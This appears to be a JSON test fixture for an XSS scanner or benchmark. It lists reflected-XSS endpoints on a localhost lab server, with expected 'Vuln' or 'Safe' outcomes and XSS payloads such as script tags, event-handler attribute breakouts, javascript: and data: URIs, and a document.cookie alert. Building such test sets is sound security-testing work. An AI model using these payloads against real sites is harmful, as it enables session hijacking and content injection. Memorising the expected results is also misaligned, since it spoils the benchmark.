@@ -1,0 +1,223 @@
+{
+  "_meta": {
+    "category": "Reflected",
+    "description": "Reflected XSS endpoints — payloads reflect immediately in the response",
+    "target": "http://localhost:9090"
+  },
+  "endpoints": [
+    {
+      "name": "reflected-body",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/body",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "display_url": null,
+      "form_fields": {},
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<body onload=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<script>prompt(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "javascript:alert(1)", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-attribute",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/attribute",
+      "method": "GET",
+      "params": ["user"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "\" onfocus=alert(1) autofocus=\"", "target_param": "user", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\"><script>alert(1)</script>", "target_param": "user", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "'><script>alert(1)</script>", "target_param": "user", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\" autofocus onfocus=\"alert(1)", "target_param": "user", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "javascript:alert(1)", "target_param": "user", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-attribute-unquoted",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/attribute-unquoted",
+      "method": "GET",
+      "params": ["color"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": " onfocus=alert(1) autofocus=", "target_param": "color", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-script",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/script",
+      "method": "GET",
+      "params": ["name"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "';alert(1)//", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "\";alert(1)//", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "'+alert(1)+'", "target_param": "name", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-event",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/event",
+      "method": "GET",
+      "params": ["val"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "';alert(1)//", "target_param": "val", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "');alert(1)//", "target_param": "val", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "'+alert(1)+'", "target_param": "val", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-href",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/href",
+      "method": "GET",
+      "params": ["url"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "javascript:alert(1)", "target_param": "url", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "data:text/html,<script>alert(1)</script>", "target_param": "url", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "javascript:alert(document.cookie)", "target_param": "url", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-meta",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/meta",
+      "method": "GET",
+      "params": ["redir"],
+      "expected": "Safe",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "javascript:alert(1)", "target_param": "redir", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-textarea",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/textarea",
+      "method": "GET",
+      "params": ["msg"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "</textarea><script>alert(1)</script>", "target_param": "msg", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-comment",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/comment",
+      "method": "GET",
+      "params": ["data"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "--><script>alert(1)</script>", "target_param": "data", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-iframe",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/iframe",
+      "method": "GET",
+      "params": ["src"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "javascript:alert(1)", "target_param": "src", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "data:text/html,<script>alert(1)</script>", "target_param": "src", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-style",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/style",
+      "method": "GET",
+      "params": ["bg"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "</style><script>alert(1)</script>", "target_param": "bg", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-header",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/header",
+      "method": "GET",
+      "params": ["q"],
+      "expected": "Safe",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<svg onload=alert(1)>", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "javascript:alert(1)", "target_param": "q", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-json",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/json",
+      "method": "GET",
+      "params": ["callback"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "alert(1)", "target_param": "callback", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-js-string",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/js-string",
+      "method": "GET",
+      "params": ["lang"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "\";alert(1)//", "target_param": "lang", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-css",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/css",
+      "method": "GET",
+      "params": ["color"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "</style><script>alert(1)</script>", "target_param": "color", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    },
+    {
+      "name": "reflected-multiparams",
+      "category": "Reflected",
+      "url": "http://localhost:9090/reflected/multiparams",
+      "method": "GET",
+      "params": ["a", "b", "c"],
+      "expected": "Vuln",
+      "stored_mode": false,
+      "payloads": [
+        {"payload": "<script>alert(1)</script>", "target_param": "a", "confidence": 1.0, "technique": "original", "severity": "medium"},
+        {"payload": "<img src=x onerror=alert(1)>", "target_param": "b", "confidence": 1.0, "technique": "original", "severity": "medium"}
+      ]
+    }
+  ]
+}
